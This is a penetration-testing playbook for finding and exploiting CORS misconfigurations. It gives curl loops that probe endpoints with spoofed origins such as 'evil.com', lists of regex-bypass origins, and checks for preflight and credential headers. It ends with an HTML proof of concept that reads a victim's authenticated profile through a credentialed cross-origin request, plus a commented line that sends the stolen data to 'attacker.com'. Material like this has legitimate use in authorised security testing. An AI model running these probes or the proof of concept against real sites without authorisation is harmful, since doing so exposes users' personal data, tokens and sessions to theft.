# Playbook: CORS Misconfiguration Testing

## Purpose
Detect and exploit Cross-Origin Resource Sharing misconfigurations that
allow unauthorized cross-origin data access. Covers reflected origins,
null origin, wildcard, and subdomain trust issues.
Input: API endpoint list, or target domain.

---

## Step 1 — Baseline CORS Check

```bash
# Check default CORS headers on all endpoints
while read url; do
  cors=$(curl -sk -I -H "Origin: https://evil.com" "$url" \
    | grep -i "access-control")
  [ -n "$cors" ] && echo "$url → $cors"
done < live_endpoints.txt > cors_results.txt

# Quick single-target test
curl -sk -I -H "Origin: https://evil.com" "https://TARGET/api/endpoint" \
  | grep -i "access-control"
```

---

## Step 2 — Reflected Origin Test

```bash
ENDPOINT="https://TARGET/api/user"

# Test 1 — Arbitrary origin reflected
curl -sk -I -H "Origin: https://evil.com" "$ENDPOINT" | grep -i "access-control"
# VULNERABLE if: Access-Control-Allow-Origin: https://evil.com

# Test 2 — Null origin (sandboxed iframe, data: URI)
curl -sk -I -H "Origin: null" "$ENDPOINT" | grep -i "access-control"
# VULNERABLE if: Access-Control-Allow-Origin: null

# Test 3 — Subdomain reflection
curl -sk -I -H "Origin: https://subdomain.TARGET" "$ENDPOINT" | grep -i "access-control"
# May indicate regex-based matching: *.TARGET is trusted

# Test 4 — Prefix/suffix bypass
curl -sk -I -H "Origin: https://TARGETevil.com" "$ENDPOINT" | grep -i "access-control"
curl -sk -I -H "Origin: https://evil-TARGET" "$ENDPOINT" | grep -i "access-control"
curl -sk -I -H "Origin: https://evil.com.TARGET" "$ENDPOINT" | grep -i "access-control"
```

---

## Step 3 — Credential Exposure Check

```bash
# Critical: Does the server send credentials with reflected origin?
curl -sk -D- -H "Origin: https://evil.com" "$ENDPOINT" | grep -iE "(access-control-allow-credentials|access-control-allow-origin)"

# CRITICAL if BOTH:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true
# This allows cookie-authenticated cross-origin requests
```

---

## Step 4 — Advanced Bypass Techniques

```bash
# Regex bypass attempts
ORIGINS=(
  "https://evil.com"
  "https://TARGET.evil.com"
  "https://TARGETevil.com"
  "https://evil-TARGET.com"
  "https://evil.TARGET.com"
  "https://subdomain.TARGET"
  "null"
  "https://TARGET%60.evil.com"
  "https://TARGET%2f.evil.com"
  "http://TARGET"            # HTTP downgrade
  "https://TARGET:evil.com"
)

for origin in "${ORIGINS[@]}"; do
  acao=$(curl -sk -I -H "Origin: $origin" "$ENDPOINT" \
    | grep -i "access-control-allow-origin" | awk '{print $2}')
  [ -n "$acao" ] && echo "[REFLECTED] Origin: $origin → ACAO: $acao"
done
```

---

## Step 5 — Wildcard Check

```bash
# Wildcard with credentials is invalid per spec, but check anyway
curl -sk -I -H "Origin: https://evil.com" "$ENDPOINT" \
  | grep -i "access-control"

# If Access-Control-Allow-Origin: * AND no credentials needed
# → low severity (public data)
# If Access-Control-Allow-Origin: * AND auth tokens in URL/headers
# → medium severity
```

---

## Step 6 — Preflight Request Analysis

```bash
# OPTIONS preflight — what methods and headers are allowed?
curl -sk -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: X-Custom-Header,Authorization" \
  "$ENDPOINT" -D- | grep -i "access-control"

# Check:
#   Access-Control-Allow-Methods: GET, POST, PUT, DELETE (too permissive?)
#   Access-Control-Allow-Headers: * (everything allowed?)
#   Access-Control-Max-Age: 86400 (cached too long?)
```

---

## Step 7 — PoC HTML

```html
<!-- Save as cors_poc.html and open in browser -->
<html>
<body>
<h2>CORS PoC — Data Theft</h2>
<div id="result"></div>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    document.getElementById("result").innerText = xhr.responseText;
    // In real attack: send to attacker server
    // new Image().src = "https://attacker.com/log?data=" +
    //   encodeURIComponent(xhr.responseText);
  }
};
xhr.open("GET", "https://TARGET/api/user/profile", true);
xhr.withCredentials = true;
xhr.send();
</script>
</body>
</html>
```

---

## Output

```
ENDPOINT      : GET /api/user/profile
ORIGIN SENT   : https://evil.com
ACAO RETURNED : https://evil.com
ACAC RETURNED : true
SEVERITY      : CRITICAL — authenticated data readable cross-origin
IMPACT        : Attacker-controlled page can read victim's profile data
                including PII, tokens, and session info
EVIDENCE      : [request/response headers + PoC HTML]
NEXT STEPS    : Test all API endpoints, load report_writer.md
```

---

## Tools Reference

```bash
# CORScanner — bulk CORS testing
pip install cors
python3 cors_scan.py -u "https://TARGET" -t 10

# Corsy
python3 corsy.py -u "https://TARGET/api/"
```
